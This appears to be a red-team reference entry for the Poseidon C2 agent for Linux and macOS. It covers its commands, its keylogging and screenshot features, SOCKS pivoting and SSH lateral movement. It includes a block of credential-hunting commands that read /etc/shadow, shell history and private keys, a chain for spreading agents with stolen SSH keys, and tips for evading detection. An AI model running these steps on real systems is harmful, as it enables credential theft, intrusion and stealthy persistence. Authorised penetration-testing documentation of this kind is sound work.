---
name: Poseidon
mythic_payload_type: poseidon
supported_os: [linux, macos]
description: Go-based Linux/macOS Mythic agent, sibling to Apollo with matching command set
author: MythicAgents
source_url: https://github.com/MythicAgents/poseidon
version_tested: 3.x (reference 2026-05-29)
binary_type_execution:
  .net-assembly:
    command: null
    upload_required: false
    parameters_template: {}
    fallback: |
      Poseidon targets Linux and macOS — .NET assembly execution requires the Mono
      runtime or .NET runtime to be present on the target. No built-in .NET runner.
      For .NET execution on Linux targets, compile the .NET tool as a self-contained
      Linux binary, upload and execute via shell command.
  bof:
    command: null
    upload_required: false
    parameters_template: {}
    fallback: |
      Poseidon does not have a BOF runner (BOFs are Windows-only format).
      For in-process capability on Linux, compile the equivalent tool as a shared
      library and use Poseidon's load_library command if available, or execute
      as a subprocess via shell command.
  powershell-script:
    command: null
    upload_required: false
    parameters_template: {}
    fallback: |
      No PowerShell on standard Linux/macOS targets. Use shell commands with bash/zsh.
      PowerShell Core (pwsh) may be installed on some targets — check for it first.
  shellcode:
    command: null
    upload_required: false
    parameters_template: {}
    fallback: |
      Poseidon does not have a shellcode injection command for Linux.
      Linux shellcode injection requires process_injection (if available) or a
      custom tool compiled for the target platform.
  native-exe:
    command: shell
    upload_required: true
    parameters_template:
      command: "<uploaded binary path> <args>"
    fallback: Upload binary to target, chmod +x, execute via shell command.
  python-script:
    command: shell
    upload_required: true
    parameters_template:
      command: "python3 <uploaded script path> <args>"
    fallback: Python3 is available on most Linux targets.
native_capabilities:
  shell:
    command: shell
    parameters:
      command: "<shell command string>"
    notes: Execute arbitrary shell commands (bash/sh). Primary execution primitive.
  list_shares:
    command: list_shares
    parameters:
      host: "<target hostname or IP>"
    notes: Enumerate accessible SMB/NFS shares on a target.
  port_scan:
    command: portscan
    parameters:
      hosts: "<comma-separated hosts or CIDR>"
      ports: "<comma-separated ports>"
    notes: TCP port scanner built into the agent.
  socks:
    command: socks
    parameters:
      action: "<start|stop>"
      port: "<SOCKS5 port>"
    notes: Built-in SOCKS5 proxy for network pivoting.
  ssh_exec:
    command: ssh_exec
    parameters:
      target_host: "<host>"
      username: "<user>"
      private_key: "<path to private key>"
      command: "<command>"
    notes: Execute commands on remote hosts via SSH. Lateral movement on Linux.
  ssh_spawn:
    command: ssh_spawn
    parameters:
      target_host: "<host>"
      username: "<user>"
      private_key: "<path to private key>"
    notes: Spawn a new Poseidon agent on a remote Linux/macOS host via SSH.
  keylog:
    command: keylog
    parameters:
      duration: "<seconds>"
    notes: Keylogger for Linux (X11-based, requires display access). macOS uses plist.
  screenshot:
    command: screenshot
    parameters: {}
    notes: Capture screen on Linux (X11) or macOS.
  get_clipboard:
    command: clipboard
    parameters: {}
    notes: Read clipboard contents on macOS; limited on Linux.
  download:
    command: download
    parameters:
      path: "<file path to download>"
    notes: Download file from target to Mythic.
  upload:
    command: upload
    parameters:
      remote_path: "<destination path>"
      file: "<Mythic file UUID>"
    notes: Upload file from Mythic to target.
file_upload_pattern: |
  Poseidon's upload command transfers files from Mythic's file store to the target.
  For native executables and scripts:
  1. Upload to Mythic (get UUID via upload_file_by_file_uuid)
  2. Poseidon upload command: upload /tmp/tool
  3. chmod +x /tmp/tool (via shell command)
  4. Execute via shell: /tmp/tool <args>
opsec_notes: |
  Poseidon is a Go binary with configurable C2 profiles (HTTP, HTTPS, DNS). It runs
  as a user-space process with no elevated privilege by default. Primary OPSEC
  considerations on Linux:
  - Process name is configurable (default: poseidon or the binary name)
  - Command execution via shell spawns child processes (process creation events in auditd)
  - Network connections from Go binary may be fingerprinted by C2 traffic analysis
known_gaps:
  - bof (Windows format; not applicable on Linux/macOS)
  - .net-assembly (no CLR runner unless .NET runtime installed on target)
  - shellcode (no Linux shellcode runner built-in)
known_quirks: |
  Poseidon's SSH lateral movement (ssh_spawn, ssh_exec) is particularly useful in
  Linux environments where SSH keys are scattered across servers. It can chain SSH
  hops to reach systems not directly accessible from the initial foothold.
last_updated: 2026-05-29
---

# Poseidon

The Linux and macOS sibling to Apollo. Poseidon is a Go-based Mythic agent targeting
Unix-like systems with a focus on macOS tradecraft and Linux post-exploitation. It shares
the same command naming conventions as Apollo but adapts them for the Unix environment.

## Execution model
- Shell command execution (bash/sh) — primary execution primitive
- Native binary upload + execute (chmod +x → shell)
- Python3 execution via shell command
- SSH-based lateral movement (ssh_exec, ssh_spawn)
- Built-in SOCKS5 proxy
- No BOF runner (Windows-only format)
- No .NET runner (CLR not native to Linux/macOS without explicit runtime)

## Notable native commands

- `shell` — execute arbitrary shell commands; the primary workhorse
- `socks` — SOCKS5 proxy for network pivoting from a Linux foothold
- `ssh_spawn` — spawn a new Poseidon agent on another Linux/macOS host via SSH
- `ssh_exec` — execute commands on remote SSH-accessible hosts
- `portscan` — built-in TCP port scanner (no nmap needed)
- `list_shares` — SMB/NFS share enumeration
- `keylog` — keylogger on X11 (Linux) or via plist (macOS)
- `screenshot` — screenshot on X11/macOS
- `download` / `upload` — file transfer

## Upload and execution workflow

Unlike Apollo (which has inline_assembly for .NET), Poseidon's execution model for
tools is binary upload + shell execution:
```
1. Upload tool binary to Mythic file store
2. Poseidon upload command → /tmp/tool
3. shell: chmod +x /tmp/tool
4. shell: /tmp/tool <args>
```

## Linux Post-Exploitation via Poseidon

Common post-foothold Linux tradecraft via Poseidon shell commands:

```bash
# Credential hunting
cat /etc/shadow          (if readable — requires root)
cat ~/.bash_history      (cleartext commands, often includes passwords)
find / -name "*.pem" -o -name "id_rsa" -o -name "*.key" 2>/dev/null
grep -r "password\|passwd\|secret\|token" /etc/  2>/dev/null
cat /etc/crontab         (cron jobs — persistence and privesc)
ps aux                   (running processes)
netstat -tlnp            (listening services)
ss -tlnp                 (same, modern variant)
```

## SSH Lateral Movement Chain

Poseidon's ssh_spawn enables seamless lateral movement in SSH-key-heavy environments:
```
1. Find SSH keys: find /home -name "id_rsa" 2>/dev/null
2. Try keys against known hosts: ssh_exec target_host user /path/to/key whoami
3. If successful: ssh_spawn target_host user /path/to/key → new agent callback
```

## OPSEC considerations
- All shell command execution spawns child processes (auditable in auditd)
- Tool uploads to /tmp are obvious — prefer /dev/shm or /proc/<pid>/fd tricks
- Agent process name: configure to match a legitimate process for the target
- SOCKS proxy creates a persistent outbound connection — consider duration

## Known gaps
- **BOFs**: Windows-only format; not applicable
- **.NET assemblies**: No CLR runner without .NET runtime on target
- **Shellcode**: No built-in Linux shellcode runner

## See also
- Apollo — Windows .NET agent (companion to Poseidon)
- Athena — Cross-platform agent including macOS, with more capabilities
- Merlin — Go-based alternative with similar cross-platform scope
